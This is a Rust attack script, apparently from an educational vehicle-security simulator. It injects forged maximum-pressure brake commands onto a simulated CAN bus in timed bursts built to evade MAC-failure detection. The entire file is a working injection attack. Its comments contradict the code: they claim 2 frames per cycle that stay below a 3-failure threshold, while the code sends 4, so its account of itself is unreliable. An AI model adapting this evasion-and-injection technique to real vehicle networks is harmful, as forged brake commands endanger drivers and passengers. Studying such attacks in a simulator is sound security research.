/// ATTACK SCENARIO: Malicious Frame Injection - Short Cycles
///
/// This script demonstrates a stealthy CAN bus injection attack that sends
/// malicious BRAKE COMMANDS with INVALID MACs in short bursts to stay below detection thresholds.
/// Targets the brake controller (0x300) with 3 cycles of 2 frames each, with 2-second
/// delays between cycles to allow legitimate frames to reset the error counter.
///
/// EXPECTED BEHAVIOR: Should NOT trigger error (threshold is 3 consecutive MAC failures)
/// PURPOSE: Educational - demonstrates threshold-based detection limitations
/// DEFENSE: HSM with CMAC authentication detects invalid MACs but tolerates occasional errors

use colored::*;
use std::time::Duration;
use autonomous_vehicle_sim::network::BusClient;
use autonomous_vehicle_sim::types::can_ids;
use autonomous_vehicle_sim::hsm::{SecuredCanFrame, VirtualHSM};
use chrono::Utc;

const BUS_ADDRESS: &str = "127.0.0.1:9000";
const ATTACKER_NAME: &str = "ATTACKER_SHORT_CYCLES";
const FRAMES_PER_CYCLE: u32 = 4;
const NUM_CYCLES: u32 = 3;
const CYCLE_DELAY_MS: u64 = 2000;  // Delay between cycles (2s allows legitimate frames to reset counter)
const FRAME_DELAY_MS: u64 = 10;    // Delay between frames within a cycle (fast to avoid legitimate frame interference)

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    println!("{}", "═════════════════════════════════════════════".red().bold());
    println!("{}", "   ATTACK: Short Cycle Injection (Below Threshold)   ".red().bold());
    println!("{}", "═════════════════════════════════════════════".red().bold());
    println!();
    println!("{}", "⚠  WARNING: This is a security research tool".yellow());
    println!("{}", "⚠  Only use on authorized test systems".yellow());
    println!();

    println!("{} Connecting to CAN bus...", "→".red());
    let client = BusClient::connect(BUS_ADDRESS, ATTACKER_NAME.to_string()).await?;
    println!("{} Connected as {}!", "✓".red().bold(), ATTACKER_NAME);
    println!();

    let (_reader, mut writer) = client.split();

    // Create a temporary HSM just for calculating CRCs
    let hsm = VirtualHSM::new("TEMP_HSM".to_string(), 0x9999);

    println!("{}", "Attack Strategy:".red().bold());
    println!("{} Target: Brake Controller (CAN ID 0x300)", "→".red());
    println!("{} Sending {} cycles of attack", "→".red(), NUM_CYCLES);
    println!("{} Each cycle: {} malicious brake commands with INVALID MAC (sent at {}ms intervals)", "→".red(), FRAMES_PER_CYCLE, FRAME_DELAY_MS);
    println!("{} Delay between cycles: {}ms (allows ~20 legitimate frames to reset counter)", "→".red(), CYCLE_DELAY_MS);
    println!("{} Detection threshold: 3 consecutive MAC failures", "→".yellow());
    println!("{} Expected: Should NOT trigger error (stays below threshold)", "→".green());
    println!();

    for cycle in 1..=NUM_CYCLES {
        println!(
            "{} Starting Cycle {}/{}",
            "═══".red().bold(),
            cycle,
            NUM_CYCLES
        );

        for frame_num in 1..=FRAMES_PER_CYCLE {
            // Inject fake brake command with INVALID MAC but VALID CRC
            let fake_brake_pressure = 100u8; // Maximum brake pressure

            let data = vec![fake_brake_pressure];

            // Calculate CORRECT CRC (so CRC check passes and MAC check fails)
            let mut crc_data = Vec::new();
            crc_data.extend_from_slice(&(can_ids::BRAKE_COMMAND.value() as u32).to_le_bytes());
            crc_data.extend_from_slice(&data);
            crc_data.extend_from_slice(ATTACKER_NAME.as_bytes());
            let valid_crc = hsm.calculate_crc(&crc_data);

            // Create a SecuredCanFrame with INVALID MAC but CORRECT CRC
            // This will pass CRC check but fail MAC check → triggers MAC error threshold
            let malicious_frame = SecuredCanFrame {
                can_id: can_ids::BRAKE_COMMAND,
                data: data.to_vec(),
                source: ATTACKER_NAME.to_string(),
                timestamp: Utc::now(),
                mac: [0u8; 32],  // Invalid MAC (zeros won't match valid HMAC)
                crc: valid_crc,  // CORRECT CRC so it passes CRC check
                session_counter: frame_num as u64,
            };

            writer.send_secured_frame(malicious_frame).await?;

            println!(
                "  {} Frame {}/{}: Injected fake brake command: {}% (Invalid MAC)",
                "⚡".red(),
                frame_num,
                FRAMES_PER_CYCLE,
                fake_brake_pressure
            );

            tokio::time::sleep(Duration::from_millis(FRAME_DELAY_MS)).await;
        }

        println!("{} Cycle {} complete", "✓".red(), cycle);

        if cycle < NUM_CYCLES {
            println!("{} Waiting {}ms before next cycle...", "→".yellow(), CYCLE_DELAY_MS);
            tokio::time::sleep(Duration::from_millis(CYCLE_DELAY_MS)).await;
        }
        println!();
    }

    println!("{}", "═══════════════════════════════════════".red().bold());
    println!("{} Attack complete!", "✓".red().bold());
    println!("{} Sent {} total malicious brake commands across {} cycles", "→".red(), NUM_CYCLES * FRAMES_PER_CYCLE, NUM_CYCLES);
    println!("{} Each cycle stayed below 3-frame threshold", "→".green());
    println!("{}", "═══════════════════════════════════════".red().bold());

    Ok(())
}
